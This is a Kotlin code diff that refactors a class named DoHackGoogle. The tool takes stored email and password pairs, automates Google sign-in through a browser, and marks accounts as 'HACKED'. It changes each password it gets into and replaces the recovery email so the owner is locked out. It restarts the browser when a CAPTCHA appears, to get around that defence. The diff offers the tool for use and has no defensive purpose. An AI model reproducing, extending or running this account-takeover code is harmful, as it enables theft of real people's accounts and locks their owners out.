@@ -26,7 +26,7 @@ class DoHackGoogle() {
     suspend fun run() {
         while (true) {
             collection.random(org.bson.Document("login_status", null).append("email_status", null))
-                ?.let { googleRun(it) }
+                    ?.let { googleRun(it) }
         }
     }
 
@@ -39,99 +39,97 @@ class DoHackGoogle() {
         val newPassword = "TheMatrix@1999"
 
 
-        val pageManager = PageManager(
-            arrayListOf<Page>(
-                LoginEnterEmailPage(email) {
-                    println("enter email success")
-                },
-                LoginEnterPasswordPage(pass) {
-                    println("enter password success")
-                    update(email, "login_status", "PASSWORD_CORRECT")
-                },
-                WellcomeToNewAccount {
-                    update(email, "email_status", "HACKED")
-                    println("WellcomeToNewAccount success")
-                },
-                ChangePasswordFirstTime(newPassword) {
-                    update(email, "email_status", "HACKED")
-                    update(email, "new_pass", newPassword)
-                    println("ChangePasswordFirstTime success")
-                },
-                EnterPasswordFirstTimeChanged(newPassword) {
-                    println("EnterPasswordFirstTimeChanged success")
-                },
-                ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE) {
-                    //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                    println("ProtectYourAccount success")
-                },
-                ProtectYourAccountUpdatePhone() {
-                    println("ProtectYourAccountUpdatePhone success")
-                },
-                ProtectYourAccountUpdateRecoverEmail(recoverEmail) {
-                    println("ProtectYourAccountUpdateRecoverEmail success")
-                    update(email, "recover_email", recoverEmail)
-                },
-                ProtectYourAccountUpdateRecoverEmailSuccess {
-                    update(email, "recover_email", recoverEmail)
-                    println("ProtectYourAccountUpdateRecoverEmailSuccess success")
-                },
-                GoogleSearch {
-                    //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                    println("GoogleSearch success")
-                },
-                AccountDisable {
-                    //                    collection.updateOne(
+        PageManager(driver,
+                "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
+        ).apply {
+            addPageList(arrayListOf<Page>(
+                    LoginEnterEmailPage(email) {
+                        println("enter email success")
+                    },
+                    LoginEnterPasswordPage(pass) {
+                        println("enter password success")
+                        update(email, "login_status", "PASSWORD_CORRECT")
+                    },
+                    WellcomeToNewAccount {
+                        update(email, "email_status", "HACKED")
+                        println("WellcomeToNewAccount success")
+                    },
+                    ChangePasswordFirstTime(newPassword) {
+                        update(email, "email_status", "HACKED")
+                        update(email, "new_pass", newPassword)
+                        println("ChangePasswordFirstTime success")
+                    },
+                    EnterPasswordFirstTimeChanged(newPassword) {
+                        println("EnterPasswordFirstTimeChanged success")
+                    },
+                    ProtectYourAccount(ProtectYourAccount.DEFAULT_ACTION.UPDATE) {
+                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
+                        println("ProtectYourAccount success")
+                    },
+                    ProtectYourAccountUpdatePhone() {
+                        println("ProtectYourAccountUpdatePhone success")
+                    },
+                    ProtectYourAccountUpdateRecoverEmail(recoverEmail) {
+                        println("ProtectYourAccountUpdateRecoverEmail success")
+                        update(email, "recover_email", recoverEmail)
+                    },
+                    ProtectYourAccountUpdateRecoverEmailSuccess {
+                        update(email, "recover_email", recoverEmail)
+                        println("ProtectYourAccountUpdateRecoverEmailSuccess success")
+                    },
+                    GoogleSearch {
+                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
+                        println("GoogleSearch success")
+                    },
+                    AccountDisable {
+                        //                    collection.updateOne(
 //                        Document("email", email),
 //                        Updates.combine(Updates.set("hacked", "AccountDisable"))
 //                    )
-                    println("AccountDisable success")
-                },
-                VerifyItsYouPhoneNumber {
-                    //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                    println("VerifyItsYou success")
-                },
-                CanotLoginForYou {
-                    //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
-                    println("CanotLoginForYou success")
-                }
-            ),
-            driver,
-            "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
-        )
+                        println("AccountDisable success")
+                    },
+                    VerifyItsYouPhoneNumber {
+                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
+                        println("VerifyItsYou success")
+                    },
+                    CanotLoginForYou {
+                        //                    collection.updateOne(Document("email", email), Updates.combine(Updates.set("hacked", "Yes")))
+                        println("CanotLoginForYou success")
+                    }
+            ))
 
-        pageManager.generalWatingResult = { jsoupDoc, currentUrl ->
-            if ((jsoupDoc.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
-                PageResponse.RECAPTCHA()
-            } else PageResponse.WAITING_FOR_RESULT()
-        }
-
-        pageManager.run { pageResponse ->
-            when (pageResponse) {
-                is PageResponse.NOT_OK -> {
-                }
-                is PageResponse.OK -> {
-                    update(email, "email_status", "HACKED")
-                    driver.close()
-                    driver = Browser.firefox
-                }
-                is  PageResponse.NOT_FOUND_EMAIL -> {
-                    update(email, "email_status", "NOT_EXIST")
-                }
-                is PageResponse.INCORECT_PASSWORD, is PageResponse.PASSWORD_CHANGED -> {
-                    update(email, "login_status", "PASSWORD_INCORRECT")
-                }
-                is PageResponse.RECAPTCHA -> {
-                    driver.close()
-                    driver = Browser.firefox
-                }
-                is PageResponse.NOT_FOUND_ELEMENT -> {
-                }
-                is PageResponse.WAITING_FOR_RESULT -> {
-                }
-                is PageResponse.INVALID_CURRENT_PAGE -> {
-                }
+            generalWatingResult = { jsoupDoc, currentUrl ->
+                if ((jsoupDoc.selectFirst("img#captchaimg")?.attr("src")?.length ?: 0) > 5) {
+                    PageResponse.RECAPTCHA()
+                } else PageResponse.WAITING_FOR_RESULT()
             }
-            println(pageResponse)
+
+            run { pageResponse ->
+                when (pageResponse) {
+                    is PageResponse.NOT_OK -> {
+                    }
+                    is PageResponse.OK -> {
+                        update(email, "email_status", "HACKED")
+                        driver.renew(Browser.firefox)
+                    }
+                    is PageResponse.NOT_FOUND_EMAIL -> {
+                        update(email, "email_status", "NOT_EXIST")
+                    }
+                    is PageResponse.INCORECT_PASSWORD, is PageResponse.PASSWORD_CHANGED -> {
+                        update(email, "login_status", "PASSWORD_INCORRECT")
+                    }
+                    is PageResponse.RECAPTCHA -> {
+                        driver.renew(Browser.firefox)
+                    }
+                    is PageResponse.NOT_FOUND_ELEMENT -> {
+                    }
+                    is PageResponse.WAITING_FOR_RESULT -> {
+                    }
+                    is PageResponse.INVALID_CURRENT_PAGE -> {
+                    }
+                }
+                println(pageResponse)
+            }
         }
     }
 
